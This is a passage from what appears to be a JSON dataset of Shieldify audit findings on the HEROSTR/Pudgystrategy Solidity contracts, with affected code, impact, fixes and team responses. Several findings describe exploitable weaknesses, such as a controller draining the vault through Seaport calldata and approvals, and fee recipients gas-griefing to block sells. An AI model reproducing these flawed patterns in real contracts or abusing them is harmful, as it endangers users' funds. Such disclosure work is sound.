`block.timestamp <= deadline` using the same `block.timestamp`, this check always passes and provides no meaningful timeout. The value is also not caller-controlled, so you cannot enforce stricter or different expiry policies per transaction.\n\n## Location of Affected Code\n\nFile: [NFTVault%20Final.sol#L236-L241](https://github.com/0xcaptainy/HEROSTR/blob/cafe69ed029aef74e874471b157afabfacb0d81c/NFTVault%20Final.sol#L236-L241)\n\n```solidity\nfunction burnProceedsETH(uint256 amountEth, uint256 minOut) external onlyController nonReentrant {\n  // code\n  IUniswapV2Router02(ROUTER).swapExactETHForTokensSupportingFeeOnTransferTokens{value: amountEth}(\n      minOut,\n      path,\n      address(this),\n      block.timestamp + 600  // 10 minute deadline\n  );\n  // code\n}\n```\n\n## Impact\n\n1. There is effectively no expiry/timebox on the swap path; the deadline always passes.\n2. Off-chain automation cannot enforce a specific TTL policy per trade.\n3. The hardcoded \"+600\" may give a false impression of protection while providing none.\n\n## Recommendation\n\nAdd a `deadline` parameter to `burnProceedsETH()` and require it to be in the future, optionally cap the maximum horizon to avoid excessively lax expiries.\n\n```diff\n- function burnProceedsETH(uint256 amountEth, uint256 minOut) external onlyController nonReentrant {\n+ function burnProceedsETH(uint256 amountEth, uint256 minOut, uint256 deadline) external onlyController nonReentrant {\n    require(address(this).balance >= amountEth, \"insufficient ETH\");\n    require(amountEth > 0, \"zero amount\");\n    require(minOut > 0, \"zero minOut\");\n+   require(deadline > block.timestamp, \"deadline not in future\");\n\n    address[] memory path = new address[](2);\n    path[0] = WETH;\n    path[1] = HEROSTR;\n\n    uint256 herostrBefore = IERC20(HEROSTR).balanceOf(address(this));\n\n    IUniswapV2Router02(ROUTER).swapExactETHForTokensSupportingFeeOnTransferTokens{value: amountEth}(\n        minOut,\n        path,\n        address(this),\n+       deadline\n    );\n    //  code\n}\n```\n\n## Team Response\n\n**Status: ACKNOWLEDGED - ACCEPTABLE**\n\nThe current deadline implementation provides basic protection against extremely delayed transactions. Our design uses `minOut = 0` for reliability combined with small swap tranches for price protection, making additional deadline complexity unnecessary for our use case.\n\n## [I-05] Keeper Docs Collection Address Differs from Contract Immutable\n\n## Severity\n\nInformational Risk\n\n## Description\n\nKeeper documentation lists a different OCH collection address than the vault's immutable `COLLECTION` in code. This configuration drift can cause bots to monitor or trade the wrong collection and create inconsistencies across tooling.\n\nThe documentation refers to [GenesisHero (GHERO)](https://abscan.org/token/0x7c47ea32fd27d1a74fc6e9f31ce8162e6ce070eb) collection.\n\nWhile the Vault1271 contract refers to [OCH_GACHA_WEAPON (OGW)](https://abscan.org/address/0x686bFe70F061507065f3E939C12aC9EE5a564dCf), which might not be correct.\n\n## Location of Affected Code\n\nFile: [keeper_documentation](https://github.com/0xcaptainy/HEROSTR/blob/cafe69ed029aef74e874471b157afabfacb0d81c/keeper_documentation.md)\n\n```\n## OCH Heroes System\nNFT_VAULT = \"0x7E9Ed861B4b998B4fd942216DB11fec1caA93e7B\"\nNFT_COLLECTION = \"0x7c47ea32fd27d1a74fc6e9f31ce8162e6ce070eb\" // <@ different address!\nSEAPORT = \"0x0000000000000068F116a894984e2DB1123eB395\"\nROUTER = \"0xad1eCa41E6F772bE3cb5A48A6141f9bcc1AF9F7c\"\n```\n\nFile: [NFTVault%20Final.sol#L80](https://github.com/0xcaptainy/HEROSTR/blob/cafe69ed029aef74e874471b157afabfacb0d81c/NFTVault%20Final.sol#L80)\n\n```solidity\naddress public immutable COLLECTION = 0x686bFe70F061507065f3E939C12aC9EE5a564dCf;  // OCH Heroes\n```\n\n## Impact\n\nOperational mistakes and inconsistent configuration between the contract and the off-chain system.\n\n## Recommendation\n\nAlign addresses across code and documentation.\n\n## Team Response\n\n**Status: FIXED**\n\nThis discrepancy was due to testing configurations. The team has updated the contract to reflect the correct OCH Heroes collection address used in the production contracts.\n\n**Implementation:**\n\n```solidity\naddress public immutable COLLECTION = 0x7c47ea32fd27d1a74fc6e9f31ce8162e6ce070eb;  // Corrected OCH Heroes address\n```\n\n## [I-06] Misleading Accounting: \"Sale Proceeds\" Actually Tracks Burned ETH Amount\n\n## Severity\n\nInformational Risk\n\n## Description\n\nThe metric `totalETHFromSales` is described as tracking ETH earned from selling NFTs, but it is incremented by the ETH amount passed into `burnProceedsETH()` rather than by actual marketplace sale proceeds. This conflates sale revenue with the amount routed into burns, which can diverge from real proceeds.\n\n## Location of Affected Code\n\nFile: [NFTVault%20Final.sol#L95](https://github.com/0xcaptainy/HEROSTR/blob/cafe69ed029aef74e874471b157afabfacb0d81c/NFTVault%20Final.sol#L95)\n\n```solidity\nuint256 public totalETHFromSales;   // Total ETH earned from selling OCH Heroes\n```\n\nFile: [NFTVault%20Final.sol#L251-L253](https://github.com/0xcaptainy/HEROSTR/blob/cafe69ed029aef74e874471b157afabfacb0d81c/NFTVault%20Final.sol#L251-L253)\n\n```solidity\nfunction burnProceedsETH(uint256 amountEth, uint256 minOut) external onlyController nonReentrant {\n  // code\n  // Update our stats\n  totalETHFromSales += amountEth;\n  totalHEROSTRBurned += herostrReceived;\n  totalBurns++;\n\n  emit HEROSTRBurned(amountEth, herostrReceived, totalBurns);\n}\n```\n\n## Impact\n\nOperational reporting and strategy evaluation can be skewed as \"sale proceeds\" may over/understate actual marketplace revenue\n\n## Recommendation\n\n- Rename `totalETHFromSales` to reflect its meaning (e.g., `totalETHBurned` or `totalETHRoutedToBurn`).\n- If actual sale proceeds are required, increment a separate counter when sales are confirmed (e.g., upon receipt events or decoded Seaport receipts).\n\n## Team Response\n\n**Status: FIXED**\n\nWe have updated variable naming and documentation to accurately reflect what is being tracked. The variable has been renamed from `totalETHFromSales` to `totalETHBurned` to avoid confusion about its purpose.\n\n**Implementation:**\n\n```solidity\nuint256 public totalETHBurned;  // Renamed from totalETHFromSales for clarity\n\nfunction getStats() external view returns (\n    uint256 ethBalance,\n    uint256 ethSpent,\n    uint256 nftsBought,\n    uint256 ethBurned, // Updated return variable name\n    uint256 herostrBurned,\n    uint256 burnCount\n) {\n    return (\n        address(this).balance,\n        totalETHSpent,\n        totalNFTsBought,\n        totalETHBurned, // Updated variable reference\n        totalHEROSTRBurned,\n        totalBurns\n    );\n}\n```\n\n## [G-01] Router Allowance Checked on Every Swap Consumes Gas\n\n## Severity\n\nGas Optimization\n\n## Description\n\nThe contract checks the router allowance on every swap and approves only when the allowance is insufficient (e.g., the first swap or after an external reset). This imposes a per-swap SLOAD and occasional SSTORE. Since the router is immutable and approval is to `type(uint256).max`, setting the approval once in the constructor allows removing (or gating) the per-swap check to reduce gas in swap execution.\n\n## Location of Affected Code\n\nFile: [HEROSTR.sol#L462-L465](https://github.com/0xcaptainy/HEROSTR/blob/cafe69ed029aef74e874471b157afabfacb0d81c/HEROSTR.sol#L462-L465)\n\n```solidity\nfunction _swapBackExact(uint256 tokensToSwap) private returns (uint256 sold) {\n  // code\n  // Check if we need approval (more gas efficient)\n  uint256 currentAllowance = allowance(address(this), address(router));\n  if (currentAllowance < tokensToSwap) {\n      _approve(address(this), address(router), type(uint256).max);\n  }\n  // code\n}\n```\n\n## Impact\n\n- Saves an SLOAD on every swap and avoids occasional SSTORE when allowance is topped up.\n- Reduces per-swap gas, which compounds across frequent swapbacks.\n\n## Recommendation\n\nConsider applying the following changes:\n\n- In the `constructor()`, set a one-time infinite approval:\n\n```solidity\n_approve(address(this), address(router), type(uint256).max);\n```\n\n- Remove the per-swap allowance check/approve in `_swapBackExact()`.\n- Remove the extra `approveRouterMax()` function, with constructor-time approval and no per-swap checks, it becomes redundant.\n\n## Team Response\n\n**Status: FIXED**\n\nWe have implemented the suggested optimization by setting infinite approval in the constructor and removing per-swap allowance checks.\n\n**Implementation:**\n\n```solidity\n// In constructor\n_approve(address(this), address(router), type(uint256).max);\n\n// Removed allowance check from _swapBackExact\n```\n\n## [G-02] Use Immutables/Constants for WETH and Distribution Shares\n\n## Severity\n\nGas Optimization\n\n## Description\n\n- WETH address fetched via external call on demand. Caching the WETH address as `immutable` in the constructor avoids external calls in hot paths.\n- Distribution shares (`vaultShare`, `accumulatorShare`, `teamShare`) are never mutated in this contract yet are read from storage on each distribution, marking them `constant` (or `immutable`) removes repeated SLOADs.\n\n## Location of Affected Code\n\nFile: [HEROSTR.sol#L343-L345](https://github.com/0xcaptainy/HEROSTR/blob/cafe69ed029aef74e874471b157afabfacb0d81c/HEROSTR.sol#L343-L345)\n\n```solidity\nfunction _WETH() private view returns (address) {\n    return router.WETH();\n}\n```\n\nFile: [HEROSTR.sol#L107-L109](https://github.com/0xcaptainy/HEROSTR/blob/cafe69ed029aef74e874471b157afabfacb0d81c/HEROSTR.sol#L107-L109)\n\n```solidity\n// Distribution shares\nuint256 public vaultShare = 80;\nuint256 public accumulatorShare = 10;\nuint256 public teamShare = 10;\n```\n\n## Impact\n\n- Saves one or more external calls per swap/distribution and in `unwrapAllWETH()`.\n- Removes SLOADs during distribution, reducing gas cost on every swapback.\n\n## Recommendation\n\n- Add `address public immutable WETH;` set in the constructor as `WETH = IUniswapV2Router02(_router).WETH();` and replace `_WETH()` usages with `WETH`.\n- Declare shares as constants, e.g., `uint256 public constant VAULT_SHARE = 80;`, `ACCUMULATOR_SHARE = 10;`, `TEAM_SHARE = 10;`, and update computations to use these constants.\n\n## Team Response\n\n**Status: FIXED**\n\nWe have implemented both optimizations:\n\n1. Cached WETH address as immutable in constructor\n2. Converted distribution shares to constants\n\n**Implementation:**\n\n```solidity\naddress public immutable WETH;\nuint256 public constant VAULT_SHARE = 80;\nuint256 public constant ACCUMULATOR_SHARE = 10;\nuint256 public constant TEAM_SHARE = 10;\n\n// In constructor\nWETH = IUniswapV2Router02(_router).WETH();\n```\n\n",
      "summary": "",
      "quality_score": 5,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Shieldify",
      "protocol_name": "Pudgystrategy",
      "source_link": "https://github.com/shieldify-security/audits-portfolio-md/blob/main/PudgyStrategy-Security-Review.md",
      "github_link": "",
      "tags": [
        "1/64 Rule"
      ],
      "finders": [
        "Shieldify Security"
      ]
    },
    {
      "id": "63043",
      "title": "[L-07] The `manualSwapback()` Function Callable By the Owner/ SwapperBot Even If `swapEnabled` Is False",
      "impact": "LOW",
      "content": "\n## Severity\n\nLow Risk\n\n## Description\n\nThe `manualSwapback()` function can be called by the `owner` or `swapperBot` regardless of `swapEnabled` or `swapActivated` flags. This allows bypassing swap gating.\n\n## Location of Affected Code\n\nFile: [HEROSTR.sol#L644](https://github.com/0xcaptainy/HEROSTR/blob/cafe69ed029aef74e874471b157afabfacb0d81c/HEROSTR.sol#L644)\n\n```solidity\nfunction manualSwapback(uint256 amount) external onlyOwnerOrBot nonReentrant {\n    require(amount > 0, \"amount must be > 0\");\n    uint256 bal = balanceOf(address(this));\n    if (amount > bal) amount = bal;\n    if (amount == 0) return;\n    _swapBackExact(amount);\n}\n```\n\n## Impact\n\nOwner or bot could manually trigger large swaps even when swapback was supposed to be disabled (a malicious bot/owner can cause unexpected swaps.\n\n## Recommendation\n\nAdd `require(swapEnabled, \"swap disabled\");` or `require(swapActivated, \"swap not activated\");` to `manualSwapback()` function.\n\n## Team Response\n\n**Status: ACKNOWLEDGED - BY DESIGN**\n\nThis functionality is intentional. It allows the owner and authorized bots to execute manual swapbacks even when automatic swapping is disabled, providing operational control during edge cases or maintenance periods. This design choice ensures system flexibility while maintaining proper access controls.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Shieldify",
      "protocol_name": "Pudgystrategy",
      "source_link": "https://github.com/shieldify-security/audits-portfolio-md/blob/main/PudgyStrategy-Security-Review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Shieldify Security"
      ]
    },
    {
      "id": "63042",
      "title": "[L-06] The `userStatsFor()` Function Returns `cap = 0` After `minute > 50`",
      "impact": "LOW",
      "content": "\n## Severity\n\nLow Risk\n\n## Description\n\nIf `minutesSince() > 50`, `cumulativeCapFor` returns `type(uint256).max`, but `userStatsFor` maps that to `cap = 0` and `available = 0`. That is misleading: on-chain caps are lifted but this view reports zero available capacity.\n\n## Location of Affected Code\n\nFile: [HEROSTR.sol#L293-L314](https://github.com/0xcaptainy/HEROSTR/blob/cafe69ed029aef74e874471b157afabfacb0d81c/HEROSTR.sol#L293-L314)\n\n```solidity\nfunction userStatsFor(address user) external view returns (\n    uint256 minute,\n    uint256 cap,\n    uint256 bought,\n    uint256 available,\n    uint256 taxBps\n) {\n    uint256 m = minutesSince();\n    uint256 userCap = cumulativeCapFor(user, m);\n    uint256 userBought = totalBought[user];\n\n    minute = m;\n    bought = userBought;\n    if (userCap == type(uint256).max) {\n        cap = 0;\n        available = 0;\n    } else {\n        cap = userCap > bought ? (userCap - bought) : 0;\n        available = cap;\n    }\n    taxBps = currentTaxBps();\n}\n```\n\n## Impact\n\nFront-ends and bots using `userStatsFor` will incorrectly show users they cannot buy more after minute 50, even though on-chain buys are allowed.\n\n## Recommendation\n\nReturn `cap = type(uint256).max` or return a boolean `capsLifted` so front-ends can correctly interpret.\n\n## Team Response\n\n**Status: FIXED**\n\nWe have modified the function to return `cap = type(uint256).max` when caps are lifted after minute 50, providing clearer information to front-ends and users about the unlimited buying capacity.\n\n**Implementation:**\n\n```solidity\nif (userCap == type(uint256).max) {\n    cap = type(uint256).max; // Changed from 0\n    available = type(uint256).max; // Changed from 0\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Shieldify",
      "protocol_name": "Pudgystrategy",
      "source_link": "https://github.com/shieldify-security/audits-portfolio-md/blob/main/PudgyStrategy-Security-Review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Shieldify Security"
      ]
    },
    {
      "id": "63041",
      "title": "[L-05] The `setRouter()` Function Does Not Set `isCapExempt[r]`",
      "impact": "LOW",
      "content": "\n## Severity\n\nLow Risk\n\n## Description\n\nOwner can add routers via `setRouter()`, but the function does not mark the router as `isCapExempt`. In constructor the initial router was added to `isCapExempt` but `setRouter()` does not follow that behavior.\n\n## Location of Affected Code\n\nFile: [HEROSTR.sol#L599-L603](https://github.com/0xcaptainy/HEROSTR/blob/cafe69ed029aef74e874471b157afabfacb0d81c/HEROSTR.sol#L599-L603)\n\n```solidity\nfunction setRouter(address r, bool allowed) external onlyOwner {\n    require(r != address(0), \"zero\");\n    isRouter[r] = allowed;\n    emit RouterSet(r, allowed);\n}\n```\n\n## Impact\n\nIf the owner adds an aggregator router that wraps buys, but does not mark it cap-exempt, buys routed through that aggregator might be counted against per-address caps or trigger unexpected cap enforcement.\n\n## Recommendation\n\nWhen setting a router, consider also setting `isCapExempt[r] = true` or require the admin to intentionally mark cap exemption.\n\n## Team Response\n\n**Status: FIXED**\n\nWe have implemented the suggested fix to automatically exempt new routers from caps when they are added, while maintaining flexibility for operational requirements.\n\n**Implementation:**\n\n```solidity\nfunction setRouter(address r, bool allowed) external onlyOwner {\n    require(r != address(0), \"zero\");\n    isRouter[r] = allowed;\n    if (allowed) {\n        isCapExempt[r] = true; // Auto-exempt new routers from caps\n    }\n    emit RouterSet(r, allowed);\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Shieldify",
      "protocol_name": "Pudgystrategy",
      "source_link": "https://github.com/shieldify-security/audits-portfolio-md/blob/main/PudgyStrategy-Security-Review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Shieldify Security"
      ]
    },
    {
      "id": "63040",
      "title": "[L-04] Controller Can Buy Arbitrary NFTs and Steal OCH Via Approvals",
      "impact": "LOW",
      "content": "\n## Severity\n\nLow Risk\n\n## Description\n\n1. The purchase path accepts opaque Seaport calldata and only checks the function selector, without enforcing that acquired assets belong to `COLLECTION`, and it uses explicit ETH forwarding with no contract-side spend cap (`valueWei` is fully chosen by the controller).\n2. The approval path allows the controller to designate an arbitrary operator for any `nft`, enabling transfer of all vault-held tokens of that collection, including OCH, by an attacker-controlled operator.\n\nThese behaviors contradict stated assurances in the documentation that the executor cannot drain the vault and the vault cannot buy arbitrary NFTs outside the OCH collection.\n\nRelevant documentation statements:\n\n> - Executor cannot drain vault funds.  \n>   ...\n> - Vault cannot buy arbitrary NFTs outside OCH collection.\n\n## Location of Affected Code\n\nFile: [NFTVault%20Final.sol#L155](https://github.com/0xcaptainy/HEROSTR/blob/cafe69ed029aef74e874471b157afabfacb0d81c/NFTVault%20Final.sol#L155)\n\n```solidity\nfunction buyViaSeaport(bytes calldata data, uint256 valueWei) external onlyController nonReentrant {\n    require(address(this).balance >= valueWei, \"insufficient vault ETH\");\n    require(data.length >= 4, \"calldata too short\");\n    require(bytes4(data[0:4]) == FULFILL_ADVANCED_SELECTOR, \"bad seaport selector\");\n\n    uint256 ethBefore = address(this).balance;\n\n    (bool success, bytes memory returnData) = SEAPORT.call{value: valueWei}(data);\n    require(success, _getRevertMsg(returnData, \"seaport call failed\"));\n\n    uint256 ethSpent = ethBefore - address(this).balance;\n    totalETHSpent += ethSpent;\n    totalNFTsBought++;\n    emit NFTBought(0, ethSpent, bytes32(0));\n}\n```\n\nFile: [NFTVault%20Final.sol#L184-L191](https://github.com/0xcaptainy/HEROSTR/blob/cafe69ed029aef74e874471b157afabfacb0d81c/NFTVault%20Final.sol#L184-L191)\n\n```solidity\nfunction setApprovalForCollection(address nft, address operator, bool approved) external onlyController nonReentrant {\n    IERC721(nft).setApprovalForAll(operator, approved);\n    emit ApprovalSet(nft, operator, approved);\n}\n```\n\n## Impact\n\n1. The controller can drain vault ETH by fulfilling arbitrary Seaport orders, including buying non-OCH or worthless assets at inflated prices, because the function neither validates the collection against `COLLECTION` nor enforces any contract-side max spend; it relies on explicit ETH forwarding where `valueWei` is fully chosen by the controller.\n2. The controller can steal OCH NFTs held by the vault by setting approval for the OCH collection to an operator they control, then transferring all tokens through that operator.\n\n## Recommendation\n\nConsider applying the following changes:\n\n- Restrict purchases to the OCH collection and bounded spend:\n  - Replace opaque `bytes data` with typed parameters (or decode `AdvancedOrder`) and assert that every received ERC721 item has `token` equal to `COLLECTION` and expected `identifier` constraints.\n  - Enforce a configurable per-tx and per-interval max spend and validate `valueWei <= maxSpend` and that consideration recipients are expected marketplace addresses.\n- Enforce operator and collection allowlists on approvals:\n  - Remove or restrict `setApprovalForCollection()` to only permit `nft == COLLECTION` and `operator == OPENSEA_CONDUIT`.\n  - If flexibility is required, gate changes behind an owner-controlled whitelist and cooldown, not the controller.\n\n## Team Response\n\n**Status: PARTIALLY FIXED**\n\nThe team acknowledges the security concern regarding arbitrary NFT purchases. We have implemented collection validation to restrict purchases to only the OCH Heroes collection. However, the controller trust model is by design for operational flexibility. The following changes have been implemented:\n\n- Added collection validation in `buyViaSeaport()` to ensure only OCH Heroes NFTs can be purchased\n- Restricted `setApprovalForCollection()` to only allow the OCH collection and OpenSea conduit\n- Maintained controller trust for operational requirements\n\n**Implementation:**\n\n```solidity\n// Added validation function\nfunction _validateOCHPurchase(bytes calldata data) private view {\n    // Validates that OCH collection address appears in Seaport calldata\n}\n\n// Updated setApprovalForCollection with restrictions\nfunction setApprovalForCollection(address nft, address operator, bool approved) external onlyController {\n    require(nft == COLLECTION, \"only OCH collection allowed\");\n    require(operator == OPENSEA_CONDUIT, \"only OpenSea conduit allowed\");\n    // ...\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Shieldify",
      "protocol_name": "Pudgystrategy",
      "source_link": "https://github.com/shieldify-security/audits-portfolio-md/blob/main/PudgyStrategy-Security-Review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Shieldify Security"
      ]
    },
    {
      "id": "63039",
      "title": "[L-03] The `unwrapAllWETH()` Function Creates Stuck ETH With No Withdrawal Path",
      "impact": "LOW",
      "content": "\n## Severity\n\nLow Risk\n\n## Description\n\nThe `unwrapAllWETH()` function allows the owner to convert WETH to ETH, but the resulting ETH has no dedicated withdrawal mechanism and will accumulate in the contract balance with no way to withdraw it.\n\n## Location of Affected Code\n\nFile: [HEROSTR.sol#L678-L681](https://github.com/0xcaptainy/HEROSTR/blob/cafe69ed029aef74e874471b157afabfacb0d81c/HEROSTR.sol#L678-L681)\n\n```solidity\nfunction unwrapAllWETH() external onlyOwner {\n    uint256 b = IWETH(_WETH()).balanceOf(address(this));\n    if (b > 0) IWETH(_WETH()).withdraw(b);\n}\n```\n\n## Impact\n\nThe function serves no useful purpose and creates guaranteed stuck ETH.\n\n## Recommendation\n\nRemove the `unwrapAllWETH()` function entirely. WETH tokens stuck in the contract can already be rescued using the existing `rescueTokens()` function, allowing the owner to unwrap them externally if needed. This eliminates the risk of creating stuck ETH while maintaining the ability to recover WETH assets.\n\n## Team Response\n\n**Status: FIXED**\n\nAgreed. This function serves no useful purpose and creates unnecessary risk. The team has removed the `unwrapAllWETH()` function entirely from the contract, as WETH can be recovered through the existing `rescueTokens()` mechanism if needed.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Shieldify",
      "protocol_name": "Pudgystrategy",
      "source_link": "https://github.com/shieldify-security/audits-portfolio-md/blob/main/PudgyStrategy-Security-Review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Shieldify Security"
      ]
    },
    {
      "id": "63038",
      "title": "[L-02] Malicious Fee Recipients Can Block User Sells",
      "impact": "LOW",
      "content": "\n## Severity\n\nLow Risk\n\n## Description\n\nDuring the sell pre-swap path, the contract distributes received ETH to three recipient addresses using low-level value calls. If any recipient implements a gas-hungry fallback function, it can deliberately exhaust gas and cause the entire user to sell to revert, creating a censorship/DoS vector. This attack can be triggered either by the owner setting malicious recipient addresses via `setRecipients()`, or by recipients themselves implementing gas-griefing fallbacks. The vulnerability only affects sell transactions, buy transactions continue to work normally as they do not trigger the pre-swap path.\n\n## Location of Affected Code\n\nFile: [HEROSTR.sol#L368-L380](https://github.com/0xcaptainy/HEROSTR/blob/cafe69ed029aef74e874471b157afabfacb0d81c/HEROSTR.sol#L368-L380)\n\n```solidity\nfunction _update( address from, address to, uint256 amount ) internal override {\n  // code\n  // sell pre-swap trigger\n  if (isSell && swapEnabled && swapLastTaxOnly && !inSwap) {\n      uint256 bal = balanceOf(address(this));\n      uint256 toSwap = queuedToSwap;\n      if (toSwap > bal) toSwap = bal;\n      if (toSwap > maxSwapAmount) toSwap = maxSwapAmount;\n      if (toSwap >= swapThreshold && toSwap > 0) {\n          uint256 sold = _swapBackExact(toSwap);\n          if (sold >= queuedToSwap) queuedToSwap = 0; else queuedToSwap -= sold;\n      }\n  }\n  // code\n}\n```\n\nFile: [HEROSTR.sol#L491-L498](https://github.com/0xcaptainy/HEROSTR/blob/cafe69ed029aef74e874471b157afabfacb0d81c/HEROSTR.sol#L491-L498)\n\n```solidity\nfunction _swapBackExact(uint256 tokensToSwap) private returns (uint256 sold) {\n  // code\n  // ETH distribution to external recipients during the same tx\n  if (ethReceived > 0) {\n      uint256 vaultAmount = (ethReceived * vaultShare) / 100;\n      uint256 accumulatorAmount = (ethReceived * accumulatorShare) / 100;\n      uint256 teamAmount = ethReceived - vaultAmount - accumulatorAmount;\n\n      (bool s1,) = nftVault.call{value: vaultAmount}(\"\");\n      (bool s2,) = pdgystrAccumulator.call{value: accumulatorAmount}(\"\");\n      (bool s3,) = teamWallet.call{value: teamAmount}(\"\");\n  }\n  // code\n}\n```\n\n## Impact\n\nOwners or fee recipients can induce sell censorship by implementing gas-griefing fallbacks in recipient contracts, causing user sell transactions to revert when pre-swap distribution executes. This blocks users from selling tokens for ETH but does not affect buy transactions, which continue to work normally - creating a honeypot scenario where users can enter positions but cannot exit. The attack can be initiated either by owners setting malicious recipients or by recipients themselves implementing gas-hungry fallbacks, making the severity appropriately Low.\n\n## Recommendation\n\nRestrict gas usage in external value calls to prevent gas griefing attacks while maintaining push-based distribution. Update the distribution logic to specify a reasonable gas limit:\n\n```solidity\n// ETH distribution with gas limit to prevent griefing\nif (ethReceived > 0) {\n    uint256 vaultAmount = (ethReceived * vaultShare) / 100;\n    uint256 accumulatorAmount = (ethReceived * accumulatorShare) / 100;\n    uint256 teamAmount = ethReceived - vaultAmount - accumulatorAmount;\n\n    // Use gas limit to prevent gas exhaustion attacks\n    // 100,000 gas is sufficient for most payable fallbacks but prevents griefing\n    (bool s1,) = nftVault.call{gas: 100_000, value: vaultAmount}(\"\");\n    (bool s2,) = pdgystrAccumulator.call{gas: 100_000, value: accumulatorAmount}(\"\");\n    (bool s3,) = teamWallet.call{gas: 100_000, value: teamAmount}(\"\");\n}\n```\n\nThis approach limits the gas available to each recipient's fallback function, preventing deliberate gas exhaustion while still allowing legitimate payable operations. If a call fails due to gas limitations, it should still be tracked in pending balances for manual recovery. Consider making the gas limit configurable by the owner if different recipients require varying amounts.\n\n## Team Response\n\n**Status: ACKNOWLEDGED - NO ACTION REQUIRED**\n\nThe fee recipients in our system are controlled contracts within our ecosystem (NFT Vault and PDGYSTR Accumulator). These contracts are designed to be compatible with the current implementation and do not implement gas-griefing fallback functions. The team has verified that both recipient contracts handle ETH transfers properly without excessive gas consumption. Since we control all recipient addresses, this attack vector is not applicable to our deployment.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Shieldify",
      "protocol_name": "Pudgystrategy",
      "source_link": "https://github.com/shieldify-security/audits-portfolio-md/blob/main/PudgyStrategy-Security-Review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Shieldify Security"
      ]
    },
    {
      "id": "63037",
      "title": "[L-01] Progressive Buy Cap Does Not Reach Intended 50M at Minute 50",
      "impact": "LOW",
      "content": "\n## Severity\n\nLow Risk\n\n## Description\n\nThe contract intends to ramp cumulative per-address buy caps from 200k to 50M tokens over 50 minutes. The constructor computes `slope` assuming 49 incremental steps (triangular number 1225) and includes 49 fixed 200k steps, but `cumulativeCapFor` uses `k = minute - 2`, which yields only 48 steps by minute 50 (triangular number 1176) and 48 fixed 200k steps. This step-count mismatch causes the minute-50 cap to undershoot the intended 50M target by approximately 1.8M tokens.\n\n> • Progressive buy caps: 200k -> 50M tokens over 50 minutes\n\nFile: [HEROSTR.sol#L19](https://github.com/0xcaptainy/HEROSTR/blob/cafe69ed029aef74e874471b157afabfacb0d81c/HEROSTR.sol#L19)\n\n## Location of Affected Code\n\nFile: [HEROSTR.sol#L221-L227](https://github.com/0xcaptainy/HEROSTR/blob/cafe69ed029aef74e874471b157afabfacb0d81c/HEROSTR.sol#L221-L227)\n\n```solidity\nconstructor(\n    address _router,\n    address _nftVault,\n    address _pdgystrAccumulator,\n    address _teamWallet\n) ERC20(\"Hero Strategy\", \"HEROSTR\") Ownable(msg.sender) {\n  // code\n  // Calculate cap (5% of supply)\n  capTokens = (_totalSupply * 500) / BPS;\n\n  // Calculate slope for linear growth (minutes 2-50)\n  uint256 baseSum = (400_000 + (49 * 200_000)) * 1e18; // 10.2M\n  uint256 numer = capTokens - baseSum;\n  slope = numer / 1225;\n  // code\n}\n```\n\nFile: [HEROSTR.sol#L278-L284](https://github.com/0xcaptainy/HEROSTR/blob/cafe69ed029aef74e874471b157afabfacb0d81c/HEROSTR.sol#L278-L284)\n\n```solidity\nfunction cumulativeCapFor(address user, uint256 minute) public view returns (uint256) {\n  // code\n  // cumulativeCapFor (minutes 2-50)\n  uint256 k = minute - 2;\n  uint256 extraTokens = (k * 200_000e18); // produces 48 steps by minute 50\n  uint256 slopeContribution = (slope * k * (k + 1)) / 2; // 1176 when k=48\n  baseCap = DELTA0 + DELTA1 + extraTokens + slopeContribution;\n  // code\n}\n```\n\n## Impact\n\nAt minute 50, the computed cap is approximately 48.2M instead of 50M, preventing users from reaching the documented cap during the final minute of the ramp. This leads to unexpected `ExceedsCap` reverts for buyers nearing the limit, undermines the published tokenomics, and poses short-lived fairness and reputational risks until caps lift after minute 50.\n\n## Proof of Concept\n\n**Calculation at minute 50 (as of now)**\n\n```solidity\nuint256 k = minute - 2; // 48\nuint256 extraTokens = (k * 200_000e18); // 9,600,000\nuint256 slopeContribution = (slope * k * (k + 1)) / 2; // ~32,489 * 48 * 49 / 2 = 38,207,064\nbaseCap = DELTA0 + DELTA1 + extraTokens + slopeContribution; // 400,000 + 9,600,000 + 38,207,064 = 48,207,064\n```\n\n**Calculation at minute 50 (after proposed fix applied)**\n\n```solidity\nuint256 k = minute - 1; // 49\nuint256 extraTokens = (k * 200_000e18); // 9,800,000\nuint256 slopeContribution = (slope * k * (k + 1)) / 2; // ~32,489 * 49 * 50 / 2 = 39,799,025\nbaseCap = DELTA0 + DELTA1 + extraTokens + slopeContribution; // 400,000 + 9,800,000 + 39,799,025 = 49,999,025\n```\n\nThe current implementation caps the amount to ~48.2M, while with the proposed fix, it correctly reaches 50M (with the only discrepancy being due to integer truncation caused by slope).\n\n## Recommendation\n\nConsider applying the following recommendations:\n\n- Change the implementation to use `k = minute - 1` for minutes ≥ 2, so minute 50 yields 49 steps.\n- If exact equality at minute 50 is required, consider rounding `slope` upward or clamping the minute-50 cap to the intended target to counter integer division truncation.\n\n## Team Response\n\n**Status: FIXED**\n\nWe have identified and corrected this mathematical inconsistency in the cap calculation. The fix has been implemented by changing `k = minute - 2` to `k = minute - 1` in the `cumulativeCapFor` function to ensure the intended 50M cap is reached at minute 50 as documented.\n\n**Implementation:**\n\n```solidity\n// Fixed in cumulativeCapFor function\nuint256 k = minute - 1; // Changed from minute - 2\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Shieldify",
      "protocol_name": "Pudgystrategy",
      "source_link": "https://github.com/shieldify-security/audits-portfolio-md/blob/main/PudgyStrategy-Security-Review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Shieldify Security"
      ]
